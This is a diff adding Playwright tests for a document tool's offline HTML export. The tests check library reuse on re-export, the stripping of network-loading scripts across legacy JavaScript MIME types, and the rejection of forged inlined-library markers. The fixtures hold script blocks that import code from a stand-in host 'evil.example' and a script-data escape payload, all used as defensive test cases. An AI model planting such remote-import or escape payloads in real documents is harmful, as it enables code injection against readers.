@@ -964,3 +964,357 @@ test("Export Offline fails loudly when a rich document has no vendored payload (
     await server.close();
   }
 });
+
+test("CMH-OFFLINE-07: re-exporting an already-offline document reuses its inlined libraries", async ({ page, browser }) => {
+  test.setTimeout(120000);
+  // An Offline export removes the vendored payload it consumed, so the file it produces carries the
+  // libraries inline and no payload at all. Re-exporting THAT file must reuse the copies already in
+  // it rather than demanding a payload that no longer exists.
+  const staged = stageContent(CONTENT, { key: "cmh-offline-reexport", source: "offline-reexport.html" });
+  const server = await startStaticServer(staged.dir);
+  const outDir = makeTmpDir();
+  let ctx2;
+  let ctx3;
+  try {
+    await routeRichContentLocal(page);
+    await installDownloadTextCapture(page);
+    await page.goto(server.url + "/test-doc.html");
+    await ready(page);
+    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
+
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const onceHtml = await capturedDownloadText(page);
+    expect(onceHtml).toContain('data-cmh-offline-lib="mermaid"');
+    expect(onceHtml).toContain('data-cmh-offline-lib="chartjs"');
+    expect(onceHtml).not.toContain('id="cmhVendoredRichLibs"');
+    const oncePath = path.join(outDir, "offline-once.html");
+    fs.writeFileSync(oncePath, onceHtml);
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external2 = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external2.push(route.request().url());
+      await route.abort();
+    });
+    await installDownloadTextCapture(page2);
+    await page2.goto(fileUrl(oncePath));
+    await ready(page2);
+    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
+
+    await openToolbarMenu(page2);
+    // The download event IS the assertion that the export did not fail: on the old code the export
+    // threw and showed an error toast, so no download ever arrived and this timed out.
+    await Promise.all([
+      page2.waitForEvent("download"),
+      page2.locator("#btnExportOfflineTop").click(),
+    ]);
+    const twiceHtml = await capturedDownloadText(page2);
+
+    // Exactly one copy of each library, its init shim, and each MIT notice - a re-export reuses what
+    // is already there and never accumulates a second megabyte.
+    expect((twiceHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
+    expect((twiceHtml.match(/data-cmh-offline-lib="chartjs"/g) || []).length).toBe(1);
+    expect((twiceHtml.match(/data-cmh-offline-lib-init="mermaid"/g) || []).length).toBe(1);
+    expect((twiceHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
+    expect((twiceHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
+    const notices = [...twiceHtml.matchAll(/<!--([\s\S]*?)-->/g)].map((m) => m[1]);
+    expect(notices.find((c) => c.includes("Third-party notice - mermaid"))).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
+    expect(notices.find((c) => c.includes("Third-party notice - Chart.js"))).toContain("Copyright (c) 2014-2024 Chart.js Contributors");
+    expect(networkLoadRefs(twiceHtml)).toEqual([]);
+    expect(twiceHtml).not.toContain('id="cmhVendoredRichLibs"');
+    expect(external2).toEqual([]);
+
+    const twicePath = path.join(outDir, "offline-twice.html");
+    fs.writeFileSync(twicePath, twiceHtml);
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", twicePath], { cwd: SKILL, stdio: "pipe" });
+
+    // The twice-exported file still renders its diagram and its chart with zero network.
+    ctx3 = await browser.newContext();
+    const page3 = await ctx3.newPage();
+    const external3 = [];
+    await page3.route(/^https?:\/\//, async (route) => {
+      external3.push(route.request().url());
+      await route.abort();
+    });
+    await page3.goto(fileUrl(twicePath));
+    await ready(page3);
+    await expect(page3.locator("#commentRoot pre.mermaid svg").first()).toBeVisible();
+    expect(await page3.evaluate(() => {
+      const chart = window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart");
+      return chart && chart.data && chart.data.datasets ? chart.data.datasets.length : 0;
+    })).toBe(1);
+    expect(external3).toEqual([]);
+  } finally {
+    if (ctx3) await ctx3.close();
+    if (ctx2) await ctx2.close();
+    await server.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+// Every type the HTML spec calls a JavaScript MIME type - a browser executes all of them, so both
+// offline strips must treat all of them as code. Written out literally (not derived from the
+// runtime) so a type dropped from the predicate loses its coverage here too.
+const RUNNABLE_SCRIPT_TYPES = [
+  "text/javascript", "application/javascript",
+  "text/x-javascript", "application/x-javascript",
+  "text/ecmascript", "application/ecmascript",
+  "text/x-ecmascript", "application/x-ecmascript",
+  "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
+  "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
+  "text/jscript", "text/livescript",
+];
+// Genuinely non-executable: data or transpiler-only. Widening the predicate must not start
+// deleting these - they are content, not code.
+const INERT_SCRIPT_TYPES = ["text/template", "application/json", "text/x-handlebars-template"];
+
+function typeSlug(type) {
+  return type.replace(/[^a-z0-9]+/gi, "-");
+}
+
+// Built by concatenation rather than nested template literals: a template literal interpolating
+// another one confuses the spec-reference checker's title scanner, which then cannot see the test
+// titles defined after it.
+function scriptBlock(type, marker, importTarget) {
+  return '<script type="' + type + '">\n'
+    + "/* " + marker + " */\n"
+    + 'import("https://evil.example/' + importTarget + '").catch(function () {});\n'
+    + "</script>";
+}
+
+const LEGACY_TYPE_CONTENT = [
+  "<h1>Legacy script MIME types</h1>",
+  '<p id="legacy-note">A legacy executable script type still runs in a browser.</p>',
+].concat(
+  RUNNABLE_SCRIPT_TYPES.map((t) => scriptBlock(t, "cmh-runnable-" + typeSlug(t), "egress-" + typeSlug(t) + ".js")),
+  [
+    '<script type="application/x-javascript">',
+    "/* cmh-legacy-mermaid-loader */",
+    'if (window.mermaid) window.mermaid.run({ querySelector: "pre.mermaid" });',
+    "</script>",
+    '<script type="text/livescript">',
+    "/* cmh-legacy-chart-loader pulls chart.umd.js */",
+    "</script>",
+  ],
+  INERT_SCRIPT_TYPES.map((t) => scriptBlock(t, "cmh-inert-" + typeSlug(t), "inert-" + typeSlug(t) + ".js"))
+).join("\n");
+test("CMH-OFFLINE-04: the offline strips cover every executable script MIME type, not only the modern three", async ({ page }) => {
+  test.setTimeout(90000);
+  const staged = stageContent(LEGACY_TYPE_CONTENT, { key: "cmh-offline-legacy-types", source: "offline-legacy-types.html" });
+  try {
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    // A legacy JavaScript MIME type executes exactly like `text/javascript`, so the network strip
+    // must reach EVERY one of them and remove its remote dynamic import.
+    for (const type of RUNNABLE_SCRIPT_TYPES) {
+      expect(exportedHtml, `runnable type ${type} must be stripped`).not.toContain(`cmh-runnable-${typeSlug(type)}`);
+      expect(exportedHtml, `runnable type ${type} egress target`).not.toContain(`egress-${typeSlug(type)}.js`);
+    }
+    // The renderer strip must reach them too: a stale mermaid or chart loader shim carrying a
+    // legacy type is just as dead as one carrying a modern type.
+    expect(exportedHtml, "application/x-javascript mermaid loader").not.toContain("cmh-legacy-mermaid-loader");
+    expect(exportedHtml, "text/livescript chart loader").not.toContain("cmh-legacy-chart-loader");
+
+    // ...and no further: a genuinely non-executable script block carrying the same import text is
+    // data, not code, so widening the predicate must not start deleting it.
+    for (const type of INERT_SCRIPT_TYPES) {
+      expect(exportedHtml, `inert type ${type} is data, not code`).toContain(`cmh-inert-${typeSlug(type)}`);
+      expect(exportedHtml, `inert type ${type} keeps its text`).toContain(`inert-${typeSlug(type)}.js`);
+    }
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+  } finally {
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+  }
+});
+
+const FORGERY_CONTENT = `
+<h1>Forged inlined-library marker</h1>
+<p id="forge-note">This document needs mermaid, so the export must resolve a library for it.</p>
+<pre class="mermaid cm-skip">
+flowchart LR
+  A[Alpha] --> B[Beta]
+</pre>`;
+
+const FORGED_NOTICE = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nFORGED LICENSE TEXT\n-->";
+
+// Cut the vendored payload out by INDEX (not a replace() pattern): this is a fixture removing one
+// known element, not a sanitizer, and a regex here reads to CodeQL as incomplete sanitization.
+function withoutVendoredPayload(html) {
+  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
+  if (idAt < 0) throw new Error("fixture has no vendored payload to remove");
+  const openAt = html.lastIndexOf("<script", idAt);
+  const closeAt = html.indexOf("</script>", idAt);
+  if (openAt < 0 || closeAt < openAt) throw new Error("could not bound the vendored payload");
+  return html.slice(0, openAt) + html.slice(closeAt + "</script>".length);
+}
+
+test("CMH-OFFLINE-07: a forged inlined-library marker is never re-emitted as executable code", async ({ page }) => {
+  test.setTimeout(180000);
+  // Re-emitting a captured library GRANTS IT EXECUTION in the exported file, and the document being
+  // exported is untrusted, so the `data-cmh-offline-lib` marker alone must never be taken as proof
+  // this exporter wrote it. Each forgery below defeats exactly ONE provenance gate, so the export
+  // falls through to the same loud failure a payload-less rich document has always produced
+  // (CMH-SIZE-01) instead of promoting the forged bytes into a running script. Every case keeps the
+  // OTHER gates satisfied, so each one is discriminating on its own gate.
+  const forgeries = [
+    {
+      name: "gate 1: a marker outside the head is not captured",
+      // The notice sits immediately before the script, in the body, so ONLY the location gate
+      // rejects this one.
+      head: "",
+      body: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-body */ window.__forged = 1;</script>',
+    },
+    {
+      name: "gate 2: inert type is not promoted to code",
+      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" type="application/json">"cmh-forged-inert"</script>',
+      body: "",
+    },
+    {
+      name: "gate 2: a MIME-parameter type does not execute, so it is not promoted",
+      // HTML matches a script type by ESSENCE, so `text/javascript;charset=utf-8` never runs.
+      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" type="text/javascript;charset=utf-8">/* cmh-forged-param */ window.__forged = 2;</script>',
+      body: "",
+    },
+    {
+      name: "gate 2: a nomodule body never ran in any module-supporting browser",
+      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" nomodule>/* cmh-forged-nomodule */ window.__forged = 3;</script>',
+      body: "",
+    },
+    {
+      name: "gate 2: the inline text of a src-bearing marker never ran",
+      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" src="mermaid.min.js">/* cmh-forged-src */ window.__forged = 4;</script>',
+      body: "",
+    },
+    {
+      name: "gate 3: captured code cannot smuggle egress past the strips",
+      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-egress */ import("https://evil.example/forged-egress.js").catch(function () {});</script>',
+      body: "",
+    },
+    {
+      name: "gate 4: bytes that open a script-data escape are not re-emitted",
+      // `<!--` then `<script` puts a re-parse into the script-data-double-escaped state, where the
+      // emitted `</script>` no longer closes the element and the rest of the head is swallowed.
+      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-escape */ var s = "<!--<script>x<\\/script>";</script>',
+      body: "",
+    },
+    {
+      name: "licensing: a library with no MIT notice beside it is not redistributed",
+      head: '<script data-cmh-offline-lib="mermaid">/* cmh-forged-unlicensed */ window.__forged = 5;</script>',
+      body: "",
+    },
+  ];
+
+  // Registered ONCE: a per-iteration route would stack a handler per case on the shared page.
+  await page.route(/^https?:\/\//, (route) => route.abort());
+  for (const forgery of forgeries) {
+    const staged = stageContent(FORGERY_CONTENT + forgery.body, { key: "cmh-offline-forge", source: "offline-forge.html" });
+    const downloads = [];
+    const onDownload = (d) => downloads.push(d);
+    try {
+      const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
+        .replace("</head>", forgery.head + "\n</head>");
+      fs.writeFileSync(staged.html, html);
+
+      await page.goto(fileUrl(staged.html));
+      await ready(page);
+      // Listen for THIS case only, so a late download can never be attributed to another case.
+      page.on("download", onDownload);
+      await openToolbarMenu(page);
+      await page.locator("#btnExportOfflineTop").click();
+
+      const toast = page.locator("#toast");
+      await expect(toast, forgery.name).toContainText(/missing the vendored/i, { timeout: 15000 });
+      expect(downloads, forgery.name).toHaveLength(0);
+    } finally {
+      page.off("download", onDownload);
+      fs.rmSync(staged.dir, { recursive: true, force: true });
+    }
+  }
+});
+
+test("CMH-OFFLINE-07: the last qualifying inlined library wins over one planted before it", async ({ page }) => {
+  test.setTimeout(90000);
+  // This exporter appends the library as the head's LAST child, so a qualifying copy planted
+  // earlier must never displace the genuine one - that would "succeed" with a diagram that never
+  // renders. Both copies below satisfy every provenance gate, so only the ordering rule separates
+  // them.
+  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-lastwins", source: "offline-lastwins.html" });
+  try {
+    const decoy = FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-planted-early */ window.__early = 1;</script>';
+    const genuine = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nGENUINE LICENSE TEXT\n-->"
+      + '\n<script data-cmh-offline-lib="mermaid">/* cmh-genuine-late */ window.__late = 1;</script>';
+    const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
+      .replace("</head>", decoy + "\n" + genuine + "\n</head>");
+    fs.writeFileSync(staged.html, html);
+
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    expect(exportedHtml, "the last qualifying copy travels").toContain("cmh-genuine-late");
+    expect(exportedHtml, "the earlier planted copy does not").not.toContain("cmh-planted-early");
+    expect(exportedHtml).toContain("GENUINE LICENSE TEXT");
+    expect(exportedHtml).not.toContain("FORGED LICENSE TEXT");
+    // Still exactly one of each, so ordering did not turn into duplication.
+    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
+    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
+  } finally {
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+  }
+});
+test("CMH-OFFLINE-07: the vendored payload wins over a copy already in the document", async ({ page }) => {
+  test.setTimeout(90000);
+  // The captured copy is a FALLBACK for a document whose payload is gone, never a substitute for a
+  // fresh one. With a payload present the export must inline the vendored bytes and the planted
+  // copy must not survive anywhere in the output.
+  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-precedence", source: "offline-precedence.html" });
+  try {
+    const html = fs.readFileSync(staged.html, "utf8").replace(
+      "</head>",
+      FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-planted-copy */ window.__planted = true;</script>\n</head>');
+    fs.writeFileSync(staged.html, html);
+
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    expect(exportedHtml, "the planted copy must not survive").not.toContain("cmh-planted-copy");
+    expect(exportedHtml).not.toContain("FORGED LICENSE TEXT");
+    // The real vendored library and its real notice travelled instead, exactly once each.
+    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
+    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
+    expect(exportedHtml).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+  } finally {
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+  }
+});
